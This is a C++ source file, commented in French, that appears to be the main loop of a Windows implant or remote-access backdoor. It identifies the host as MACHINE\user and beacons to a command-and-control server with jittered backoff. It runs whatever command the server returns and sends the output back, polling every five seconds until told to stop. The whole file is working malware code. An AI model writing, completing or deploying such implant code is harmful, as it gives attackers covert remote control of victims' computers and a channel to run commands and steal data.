#include "beacon.h"
#include "network.h"
#include "commands.h"
#include "config.h"
#include "service.h"
#include "log.h"
#include <windows.h>
#include <chrono>
#include <random>
#include <string>
#include <thread>

namespace {

std::mt19937& rng() {
	static std::mt19937 generator(std::random_device{}());
	return generator;
}

// Identifiant d'agent : "MACHINE\utilisateur", pour que deux implants ne
// partagent pas la même file de commandes côté contrôleur.
std::string detect_agent_id() {
	char host[MAX_COMPUTERNAME_LENGTH + 1] = {};
	DWORD host_size = sizeof(host);

	char user[256] = {};
	DWORD user_size = sizeof(user);

	const bool has_host = GetComputerNameA(host, &host_size) != 0;
	const bool has_user = GetUserNameA(user, &user_size) != 0;

	if (!has_host) {
		return FallbackAgentId;
	}

	std::string agent_id = host;
	if (has_user && user[0] != '\0') {
		agent_id += '\\';
		agent_id += user;
	}
	return agent_id;
}

// Attente entre deux tentatives : exponentielle puis plafonnée, avec un
// jitter pour éviter que plusieurs agents ne reviennent en même temps.
int backoff_delay_ms(int step) {
	std::uniform_int_distribution<int> percent(100 - BackoffJitterPct,
		100 + BackoffJitterPct);
	const int clamped = step < BackoffSteps ? step : BackoffSteps - 1;
	return BackoffMs[clamped] * percent(rng()) / 100;
}

// Attend `delay` ms, mais retourne dès que stop_event est signalé.
// Retourne true si on doit continuer, false si arrêt demandé.
bool interruptible_sleep(int delay) {
	HANDLE ev = stop_event();
	if (!ev) {
		std::this_thread::sleep_for(std::chrono::milliseconds(delay));
		return true;
	}
	const DWORD r = WaitForSingleObject(ev, static_cast<DWORD>(delay));
	return r == WAIT_TIMEOUT;
}

// Si la réponse est un JSON {"cmd": "..."}, extrait la commande brute.
std::string extract_command(const std::string& body) {
	const std::string key = "\"cmd\"";
	size_t pos = body.find(key);
	if (pos == std::string::npos) return body;
	pos = body.find(':', pos + key.length());
	if (pos == std::string::npos) return body;
	pos = body.find('"', pos + 1);
	if (pos == std::string::npos) return body;
	size_t end = body.find('"', pos + 1);
	if (end == std::string::npos) return body;
	return body.substr(pos + 1, end - pos - 1);
}

}  // namespace

void start_implant() {
	const std::string agent_id = detect_agent_id();
	std::string pending_output;
	int failures = 0;

	// Si stop_event est déjà signalé (cas uninstall), on sort tout de suite.
	if (stop_event() && WaitForSingleObject(stop_event(), 0) == WAIT_OBJECT_0) {
		return;
	}

	while (true) {
		// Sortie si arrêt demandé et plus aucune réponse à renvoyer au C2.
		if (stop_event() && WaitForSingleObject(stop_event(), 0) == WAIT_OBJECT_0 && pending_output.empty()) {
			return;
		}

		const BeaconReply reply = send_beacon(agent_id, pending_output);

		// Si arrêt demandé (ex: suite à uninstall), on sort après avoir envoyé le résultat au C2.
		if (stop_event() && WaitForSingleObject(stop_event(), 0) == WAIT_OBJECT_0) {
			return;
		}

		if (reply.result != SendResult::Ok) {
			const int delay = backoff_delay_ms(failures);
			++failures;

			const char* kind = reply.result == SendResult::HttpError
				? "HTTP" : "reseau";
			log_line(std::string("echec ") + kind + " (" +
					 std::to_string(reply.error) + "), retry dans " +
					 std::to_string(delay / 1000) + " s [tentative " +
					 std::to_string(failures) + "]");

			if (!interruptible_sleep(delay)) return;
			continue;
		}

		failures = 0;
		pending_output.clear();

		if (!reply.body.empty()) {
			const std::string cmd = extract_command(reply.body);
			if (!cmd.empty()) {
				log_line("commande executee : " + cmd);
				pending_output = execute_command(cmd);
			}
		}

		// Pause entre chaque cycle de beacon pour éviter d'inonder le serveur C2
		if (!interruptible_sleep(5000)) {
			return;
		}
	}
}
